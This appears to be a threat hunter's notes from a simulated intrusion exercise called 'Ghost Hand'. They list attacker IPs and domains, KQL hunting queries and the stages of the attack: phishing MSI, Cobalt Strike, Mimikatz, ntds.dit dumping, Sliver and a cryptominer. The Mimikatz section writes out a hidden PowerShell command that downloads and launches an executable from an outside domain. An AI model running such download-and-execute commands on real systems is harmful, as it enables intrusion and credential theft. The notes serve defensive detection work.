# Ghost Hand

- `terran` -> `South Africa` -> `IT Admin` -> `Windows DC` -> `Many Endpoints` -> `infostealer`

## IPs TODAY

```
safrica-kali-4 - 101.44.253.14
terran-cobalt7 - 104.55.222.146


repotools.net - `104.53.222.99` - FOSS Server
watchdawgz.com - 104.53.222.47 - crypto-miner
sysperform.org - 104.53.222.115 - trojan

172.20.8.104 - mildred.sexton

orng-it-14  Willow armstrong
```

## Phishing

- RepoSync.msi (Service as SYSTEM)

Found downloaded *.msi

```kql
Downloads AND *.msi
```

See service installed

```kql
event.code:7045
```

- runs as a service

**Look for reg key HKLM\SOFTWARE\WOW6432Node\wmipmon**

- Cobalt Strike beacon

```kql
message:"Creating Scriptblock text" and winlog.task: "Execute a Remote Command" and FromBase64String
```

```
(destination.port:443) and 172.20.3.14 and sysperform.org
```

cobalt strike beacon update `1634`

```
```


**Look for files dropped in C:\Windows\Temp** - app_log, Southerland


repotools.net download

```kql
*repotools.net* AND source.ip:"1.33.170.2"  AND server.port:443
```

update_re.exe - 

```kql
update_re.exe and (process.executable:*Temp* OR process.executable:*TEMP*)
```

rundll32.exe - new process on it14

```

```

## Mimikatz

## `shell powershell -nop -w hidden -c "$p='C:\\Windows\\System32\\WMIHostAdapter.exe'; iwr 'https://repotools.net/download/WMIHostAdapter.exe' -OutFile $p; Start-Process $p"`



- drop cryptominer
- run cryptominer
- Dump local Credentials

## DC

- Dump Credentials - ntds.dit
- deploy sliver

**Look for powershell -hidden Invoke-WebRequest -Uri**

## Many Endpoints

- deploy sliver
- krazcoin exfil of $

```kql
message:"Creating Scriptblock text" and winlog.task: "Execute a Remote Command" AND powershell.file.script_block_text
```
- cobalt strike info of files > csv
